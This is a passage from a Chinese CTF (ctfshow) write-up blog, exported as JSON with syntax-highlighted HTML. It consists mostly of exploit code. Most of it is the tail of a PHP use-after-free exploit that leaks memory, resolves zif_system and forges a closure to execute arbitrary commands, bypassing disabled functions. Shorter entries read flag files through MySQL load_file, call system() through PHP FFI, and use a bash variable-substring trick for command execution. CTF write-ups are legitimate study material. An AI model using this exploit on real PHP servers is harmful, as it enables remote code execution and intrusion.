class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token variable\">$abc</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    <span class=\"token variable\">$helper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Helper</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>    <span class=\"token variable\">$helper</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">79</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UAF failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    <span class=\"token comment\"># leaks</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    <span class=\"token variable\">$closure_handlers</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>    <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    <span class=\"token comment\"># fake value</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token comment\"># fake reference</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    <span class=\"token variable\">$closure_obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_handlers</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't determine binary base address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$elf</span> <span class=\"token operator\">=</span> <span class=\"token function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't parse ELF header\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get basic_functions address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$zif_system</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get zif_system address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>    <span class=\"token comment\"># fake closure object</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>    <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xd0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x110</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">,</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_obj</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>    <span class=\"token comment\"># pwn</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$fake_obj_offset</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\"># internal func type</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$zif_system</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\"># internal func handler</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"web-75\"><a class=\"anchor\" href=\"#web-75\">#</a> web 75</h2>\n<p>先通过 glob 读取文件目录</p>\n<p>用数据库 pdo 读取</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span>  <span class=\"token class-name\">PDO</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mysql : host=localhost ; dbname=ctftraining'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' root'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' root'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$dbh</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select- load_ file(\"/flag36.txt\") '</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span>  <span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"I\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">PDOException</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"web-77\"><a class=\"anchor\" href=\"#web-77\">#</a> web 77</h2>\n<p>盲测特性</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token variable\">$ffi</span> <span class=\"token operator\">=</span> FFl<span class=\"token punctuation\">:</span><span class=\"token function\">cdef</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"int system(const char *command);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'/readflag&gt; 1.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ff<span class=\"token operator\">-&gt;</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"web-118\"><a class=\"anchor\" href=\"#web-118\">#</a> web 118</h2>\n<p><code>${PATH:~A}${PWD:~A}$IFS????.???</code></p>\n<p>nl 命令</p>\n<h2 id=\"web-119\"><a class=\"anchor\" href=\"#web-119\">#</a> web 119</h2>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        }
    ]
}